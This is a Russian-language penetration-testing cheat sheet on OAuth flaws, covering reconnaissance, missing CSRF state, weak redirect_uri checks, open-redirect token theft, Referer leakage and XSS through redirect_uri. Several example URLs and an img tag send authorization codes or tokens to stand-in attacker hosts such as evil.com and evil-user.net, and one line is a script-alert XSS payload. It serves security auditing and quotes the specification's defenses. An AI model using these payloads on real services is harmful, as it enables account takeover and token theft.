*  [Разведка](#Разведка)
*  [Кража токена OAuth через Referer](#Кража-токена-OAuth-через-Referer)
*  [Перехват токена OAuth через redirect_uri](#Перехват-токена-OAuth-через-redirect_uri)
*  [Выполнение XSS через redirect_uri](#Выполнение-XSS-через-redirect_uri)
*  [Раскрытие закрытого ключа OAuth](#Раскрытие-закрытого-ключа-OAuth)
*  [Нарушение правил использования authorization code](#Нарушение-правил-использования-authorization-code)
*  [Межсайтовая подделка запроса (CSRF)](#Межсайтовая-подделка-запроса-CSRF)

# Разведка
> Если используется внешняя служба OAuth, необходимо идентифицировать конкретного провайдера по имени хоста, на который отправляется запрос на авторизацию.

Узнав имя хоста сервера авторизации, вы всегда должны попытаться отправить запрос GET на следующие стандартные конечные точки:
```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```
Они часто возвращают файл конфигурации JSON, содержащий ключевую информацию, например, подробности дополнительных функций, которые могут поддерживаться


# Уязвимости в клиентском приложении OAuth
> Спецификация OAuth определена относительно слабо. Это особенно верно в отношении реализации клиентским приложением. В потоке OAuth много подвижных частей, с большим количеством необязательных параметров и настроек конфигурации в каждом типе предоставления, что означает, что есть много возможностей для неправильных конфигураций.
___________
## Неправильная реализация неявного типа предоставления

> Из-за опасностей, возникающих при отправке токенов доступа через браузер, неявный тип предоставления в основном рекомендуется для одностраничных приложений. Однако он также часто используется в классических клиент-серверных веб-приложениях из-за своей относительной простоты.

* Токен доступа отправляется из службы OAuth в клиентское приложение через браузер пользователя в виде фрагмента URL. 
* Клиентское приложение получает доступ к токену с помощью JavaScript.

> Проблема в том, что если приложение хочет сохранить сеанс после того, как пользователь закрывает страницу, ему необходимо где-то сохранить текущие данные пользователя (обычно идентификатор пользователя и токен доступа).

* Клиентское приложение часто отправляет эти данные на сервер в запросе POST, а затем назначает пользователю сеансовый cookie, фактически регистрируя его.
> Этот запрос примерно эквивалентен запросу отправки формы, который может быть отправлен как часть классического входа на основе пароля. Однако в этом сценарии у сервера нет никаких секретов или паролей для сравнения с отправленными данными, что означает, что он неявно доверен.

Если клиентское приложение не проверит должным образом, что токен доступа соответствует другим данным в запросе. В этом случае пользователь может просто изменить параметры, отправленные на сервер, чтобы выдать себя за любого пользователя.
________
## Межсайтовая подделка запроса (CSRF)

Приложения, которые не проверяют наличие действительного CSRF-токена в OAuth callback, уязвимы. Это можно эксплуатировать, инициировав OAuth-поток и перехватив callback (`https://example.com/callback?code=AUTHORIZATION_CODE`). Этот URL можно использовать в CSRF-атаках.

> Клиент ДОЛЖЕН реализовать защиту от CSRF для своего URI перенаправления (`redirection URI`). Обычно это достигается путем требования, чтобы любой запрос, отправленный на конечную точку URI перенаправления, включал значение, которое привязывает запрос к аутентифицированному состоянию пользовательского агента. Клиенту СЛЕДУЕТ использовать параметр запроса `state` для передачи этого значения серверу авторизации при выполнении запроса на авторизацию.

________
# Уязвимости в службе OAuth
________
## Утечка кодов авторизации и токенов доступа

В зависимости от типа гранта, либо код, либо токен отправляется через браузер жертвы на конечную точку /callback, указанную в параметре redirect_uri запроса авторизации. Если служба OAuth не может должным образом проверить этот URI, злоумышленник может сконструировать атаку, подобную CSRF, обманом заставив браузер жертвы инициировать поток OAuth, который отправит код или токен на контролируемый злоумышленником redirect_uri.

В случае потока кода авторизации:
* украсть код жертвы до его использования.
* отправить этот код на законную конечную точку /callback клиентского приложения (исходный redirect_uri), чтобы получить доступ к учетной записи пользователя.
> В этом сценарии даже не нужно знать секрет клиента или полученный токен доступа. Пока есть действительный сеанс со службой OAuth, клиентское приложение просто завершит обмен кодом/токеном от имени злоумышленника, прежде чем войти в учетную запись.

> использование защиты состояния или одноразового кода не обязательно предотвращает эти атаки, поскольку злоумышленник может генерировать новые значения из своего собственного браузера.

Более безопасные серверы авторизации также потребуют отправки параметра redirect_uri при обмене кодом. Затем сервер может проверить, совпадает ли он с полученным в первоначальном запросе авторизации, и отклонить обмен, если нет. Поскольку это происходит в запросах от сервера к серверу через защищенный обратный канал, злоумышленник не может контролировать этот второй параметр redirect_uri.
________
### Некорректная проверка redirect_uri

> При аудите потока OAuth следует попробовать поэкспериментировать с параметром redirect_uri, чтобы понять, как он проверяется
```python
Добавить дополнительные значения к параметру redirect_uri по умолчанию и использовать несоответствия между анализом URI различными компонентами службы OAuth:
https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/

Отправить дубликаты параметров redirect_uri
https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net

Некоторые серверы также предоставляют особую обработку локальным URI, поскольку они часто используются во время разработки.
localhost.evil-user.net
```
**Перенаправление на контролируемый домен для получения access token**
```python
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
```

**Перенаправление на разрешенный Open URL для получения access token**
```python
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
```

> Реализации OAuth никогда не должны разрешать (whitelist) целые домены, а только конкретные URL-адреса, чтобы `redirect_uri` нельзя было указать на открытый редирект (Open Redirect).

Иногда необходимо изменить область видимости (`scope`) на недопустимую, чтобы обойти фильтр на `redirect_uri`:
```python
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
```
________

### Кража кодов и токенов доступа через страницу прокси

* Одной из самых полезных уязвимостей для этой цели является открытое перенаправление.
  * выяснить, можно ли изменить параметр redirect_uri, чтобы он указывал на любые другие страницы в домене из белого списка.
```https://client-app.com/oauth/callback/../../example/path```
  * проверить их на наличие дополнительных уязвимостей
  * найти уязвимость, которая дает доступ к параметрам запроса (для типа неявного предоставления вам нужно извлечь фрагмент URL)
 
> Для неявного типа предоставления кража токена доступа не просто позволяет вам войти в учетную запись в клиентском приложении. Поскольку весь неявный поток происходит через браузер, можно использовать токен для выполнения собственных вызовов API на сервер ресурсов службы OAuth. Это может позволить извлекать конфиденциальные пользовательские данные, к которым вы обычно не можете получить доступ из веб-интерфейса клиентского приложения.

* JavaScript, который обрабатывает параметры запроса и фрагменты URL
> Например, небезопасные скрипты обмена сообщениями. В некоторых сценариях может потребоваться определить более длинную цепочку гаджетов, которая позволяет передавать токен через ряд скриптов, прежде чем в конечном итоге передать его на ваш внешний домен.
* Уязвимости XSS
Атрибут HTTPOnly обычно используется для файлов cookie сеанса, не получится получить к ним прямой доступ с помощью XSS. Украв код или токен OAuth, пользователь может получить доступ к учетной записи цели в его собственном браузере. Это дает гораздо больше времени для изучения данных пользователя и выполнения вредоносных действий, что значительно увеличивает серьезность уязвимости XSS.
________

### Кража токена OAuth через Referer
Когда нет возможности внедрить JavaScript (например, из-за ограничений CSP или строгой фильтрации), все равно можно использовать простую HTML-инъекцию для кражи кодов авторизации. Если указать параметр redirect_uri на страницу, на которой можно внедрить свой собственный HTML-контент, можно передать код через заголовок Referer.

* Например: ```img: <img src="evil-user.net">``` При попытке получить это изображение некоторые браузеры (например, Firefox) отправят полный URL-адрес в заголовке Referer запроса, включая строку запроса.

________
# Выполнение XSS через `redirect_uri`
```python
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```
________
# Раскрытие закрытого ключа OAuth
Некоторые приложения для Android/iOS можно декомпилировать, и закрытый ключ OAuth может быть доступен.
________
# Нарушение правил использования authorization code
> **Клиент НЕ ДОЛЖЕН использовать код авторизации более одного раза.**

Если код авторизации используется более одного раза, сервер авторизации ДОЛЖЕН отклонить запрос и (по возможности) ДОЛЖЕН отозвать все токены, ранее выданные на основе этого кода авторизации.
________
